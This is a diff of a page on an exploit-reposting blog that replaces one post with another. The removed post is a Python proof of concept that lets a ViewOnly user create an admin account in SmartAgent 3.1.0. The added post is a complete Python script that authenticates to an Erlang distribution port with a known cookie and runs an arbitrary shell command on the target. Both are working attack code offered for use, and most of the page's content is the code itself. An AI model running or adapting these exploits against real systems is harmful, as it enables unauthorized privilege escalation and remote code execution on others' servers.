@@ -23,7 +23,7 @@
   <meta name="description" content="">
   <meta name="author" content="FunPhishing">
   <meta name="keywords" content="">
-  <title>SmartAgent 3.1.0 Privilege Escalation - Fun Phishing</title>
+  <title>Erlang Cookie Remote Code Execution - Fun Phishing</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -153,9 +153,9 @@
               <div class="full-bg-img">
                 <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
                   <div class="page-header text-center fade-in-up">
-                    <span class="h2 text1" id="subtitle" title="SmartAgent 3.1.0 Privilege Escalation">
+                    <span class="h2 text1" id="subtitle" title="Erlang Cookie Remote Code Execution">
                       
-                        SmartAgent 3.1.0 Privilege Escalation
+                        Erlang Cookie Remote Code Execution
                       
                     </span>
         
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-01-13 17:15" pubdate>
-        January 13, 2021 pm
+      <time datetime="2021-01-14 15:26" pubdate>
+        January 14, 2021 pm
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      232 字
+      303 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      6
        分钟
     </span>
   
@@ -218,17 +218,11 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SmartAgent 3.1.0 Privilege Escalation</h1>
+            <h1 style="display: none">Erlang Cookie Remote Code Execution</h1>
             
             <div class="markdown-body">
-              <h3 id="SmartAgent-3-1-0-Privilege-Escalation"><a href="#SmartAgent-3-1-0-Privilege-Escalation" class="headerlink" title="SmartAgent 3.1.0 Privilege Escalation"></a>SmartAgent 3.1.0 Privilege Escalation</h3><p>A Low grade user like ViewOnly can create an account with SuperUser<br>permission.  </p>
-<p>Steps To Reproduce:  </p>
-<ol>
-<li>Create a user with ViewOnly  </li>
-<li>Visit <a target="_blank" rel="noopener" href="https://demo.localhost.com/#/CampaignManager/users">https://demo.localhost.com/#/CampaignManager/users</a>  </li>
-<li>Now you will be able to create an account with SuperUser.</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-comment">#Python Exploit [Replace With Your Authorization Code]  </span><br>  <br><span class="hljs-keyword">import</span> requests  <br>  <br>session = requests.Session()  <br>  <br>rawBody = <span class="hljs-string">&quot;&#123;\&quot;username\&quot;:\&quot;orion@hridoy.com  </span><br><span class="hljs-string">\&quot;,\&quot;password\&quot;:\&quot;Orionhridoy69\&quot;,\&quot;appName\&quot;:\&quot;AppEngage\&quot;,\&quot;role\&quot;:\&quot;Admin\&quot;,\&quot;android\&quot;:\&quot;1\&quot;,\&quot;ios\&quot;:\&quot;0\&quot;,\&quot;kai\&quot;:\&quot;0\&quot;&#125;&quot;</span>  <br>headers = &#123;<span class="hljs-string">&quot;Authorization&quot;</span>:<span class="hljs-string">&quot;id=orion@gmail.com,engageToken=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJvcmlvbkBnbWFpbC5jb20iLCJyb2xlcyI6WyJWaWV3T25seSJdLCJhcHBOYW1lIjoiQXBwRW5nYWdlIiwicGxhdGZvcm0iOiJBTkRST0lEIiwiaXNzIjoiRU5BR0FHRSIsImlhdCI6MTYxMDM3NDEyMCwiZXhwIjoxNjExMjM4MTIwfQ.SbnZaRe3-2GOFOm7QDzvIBQCKBAK_GV-wKsMoH4GGChyjUFe2Ij4LiVl5rXsWRfTqNnJXj9fFxYTzkD2-kXlAQ&quot;</span>,<span class="hljs-string">&quot;Accept&quot;</span>:<span class="hljs-string">&quot;application/json,  </span><br><span class="hljs-string">text/plain, */*&quot;</span>,<span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64;  </span><br><span class="hljs-string">rv:52.0) Gecko/20100101  </span><br><span class="hljs-string">Firefox/52.0&quot;</span>,<span class="hljs-string">&quot;Referer&quot;</span>:<span class="hljs-string">&quot;https://demo.localhost.com/&quot;</span>,<span class="hljs-string">&quot;Connection&quot;</span>:<span class="hljs-string">&quot;close&quot;</span>,<span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>,<span class="hljs-string">&quot;Accept-Encoding&quot;</span>:<span class="hljs-string">&quot;gzip,  </span><br><span class="hljs-string">deflate&quot;</span>,<span class="hljs-string">&quot;DNT&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>&#125;  <br>response = session.post(<span class="hljs-string">&quot;https://demo.localhost.com/api/createUser&quot;</span>,  <br>data=rawBody, headers=headers)  <br>  <br>print(<span class="hljs-string">&quot;User Created With\nUser: orion@hridoy.com\nPass: Orionhridoy69&quot;</span>)<br><br></code></pre></div></td></tr></table></figure>
+              <h4 id="Erlang-Cookie-Remote-Code-Execution"><a href="#Erlang-Cookie-Remote-Code-Execution" class="headerlink" title="Erlang Cookie Remote Code Execution"></a>Erlang Cookie Remote Code Execution</h4><p>Erlang allows distributed Erlang instances to connect and remotely execute commands.<br>Nodes are permitted to connect to eachother if they share an authentication cookie,<br>this cookie is commonly called “.erlang.cookie”</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python3</span><br>​<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> sys<br>​<br>TARGET = <span class="hljs-string">&quot;192.168.1.1&quot;</span><br>PORT = <span class="hljs-number">25672</span><br>COOKIE = <span class="hljs-string">&quot;XXXXXXXXXXXXXXXXXXXX&quot;</span><br>CMD = <span class="hljs-string">&quot;whoami&quot;</span><br>​<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.connect((TARGET, PORT))<br>​<br>name_msg  = <span class="hljs-string">b&quot;\x00&quot;</span><br>name_msg += <span class="hljs-string">b&quot;\x15&quot;</span><br>name_msg += <span class="hljs-string">b&quot;n&quot;</span><br>name_msg += <span class="hljs-string">b&quot;\x00\x07&quot;</span><br>name_msg += <span class="hljs-string">b&quot;\x00\x03\x49\x9c&quot;</span><br>name_msg += <span class="hljs-string">b&quot;AAAAAA@AAAAAAA&quot;</span><br>​<br>s.send(name_msg)<br>s.recv(<span class="hljs-number">5</span>)                    <span class="hljs-comment"># Receive &quot;ok&quot; message</span><br>challenge = s.recv(<span class="hljs-number">1024</span>)     <span class="hljs-comment"># Receive &quot;challenge&quot; message</span><br>challenge = struct.unpack(<span class="hljs-string">&quot;&gt;I&quot;</span>, challenge[<span class="hljs-number">9</span>:<span class="hljs-number">13</span>])[<span class="hljs-number">0</span>]<br>​<br>print(<span class="hljs-string">&quot;Extracted challenge: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(challenge))<br>​<br>challenge_reply  = <span class="hljs-string">b&quot;\x00\x15&quot;</span><br>challenge_reply += <span class="hljs-string">b&quot;r&quot;</span><br>challenge_reply += <span class="hljs-string">b&quot;\x01\x02\x03\x04&quot;</span><br>challenge_reply += md5(<span class="hljs-built_in">bytes</span>(COOKIE, <span class="hljs-string">&quot;ascii&quot;</span>) + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(challenge), <span class="hljs-string">&quot;ascii&quot;</span>)).digest()<br>​<br>s.send(challenge_reply)<br>challenge_res = s.recv(<span class="hljs-number">1024</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(challenge_res) == <span class="hljs-number">0</span>:<br>    print(<span class="hljs-string">&quot;Authentication failed, exiting&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br>​<br>print(<span class="hljs-string">&quot;Authentication successful&quot;</span>)<br>​<br>ctrl = <span class="hljs-string">b&quot;\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00w\x00w\x03rex&quot;</span><br>msg  = <span class="hljs-string">b&#x27;\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k&#x27;</span><br>msg += struct.pack(<span class="hljs-string">&quot;&gt;H&quot;</span>, <span class="hljs-built_in">len</span>(CMD))<br>msg += <span class="hljs-built_in">bytes</span>(CMD, <span class="hljs-string">&#x27;ascii&#x27;</span>)<br>msg += <span class="hljs-string">b&#x27;jw\x04user&#x27;</span><br>​<br>payload = <span class="hljs-string">b&#x27;\x70&#x27;</span> + ctrl + msg<br>payload = struct.pack(<span class="hljs-string">&#x27;!I&#x27;</span>, <span class="hljs-built_in">len</span>(payload)) + payload<br>print(<span class="hljs-string">&quot;Sending cmd: &#x27;&#123;&#125;&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(CMD))<br>s.send(payload)<br>print(s.recv(<span class="hljs-number">1024</span>))<br></code></pre></div></td></tr></table></figure>
             </div>
             <hr>
             <div>
@@ -247,7 +241,7 @@
                     
                       <a class="hover-with-bg" href="/tags/poc/">poc</a>
                     
-                      <a class="hover-with-bg" href="/tags/Privilege-Escalation/">Privilege Escalation</a>
+                      <a class="hover-with-bg" href="/tags/Remote-Code-Execution/">Remote Code Execution</a>
                     
                   </div>
                 
@@ -260,9 +254,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/14/Online-Movie-Streaming-1-0-SQL-Injection/">
+                      <a href="/2021/01/14/FiberHome-HG6245D-Disclosure-Bypass-Privilege-Escalation-DoS/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Online Movie Streaming 1.0 SQL Injection</span>
+                        <span class="hidden-mobile">FiberHome HG6245D Disclosure / Bypass / Privilege Escalation / DoS</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -270,8 +264,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/01/13/Cemetery-Mapping-And-Information-System-1-0-SQL-Injection/">
-                        <span class="hidden-mobile">Cemetery Mapping And Information System 1.0 SQL Injection</span>
+                      <a href="/2021/01/14/Online-Movie-Streaming-1-0-SQL-Injection/">
+                        <span class="hidden-mobile">Online Movie Streaming 1.0 SQL Injection</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -297,7 +291,7 @@
           repo: 'chat',
           owner: 'FunPhishing',
           admin: ["FunPhishing"],
-          id: 'dea08ea5286e912da83359e8d0f16b3d',
+          id: 'a2eb5a514e904d925ddb723e7e118ed5',
           language: 'zh-CN',
           labels: ["Gitalk"],
           perPage: 10,
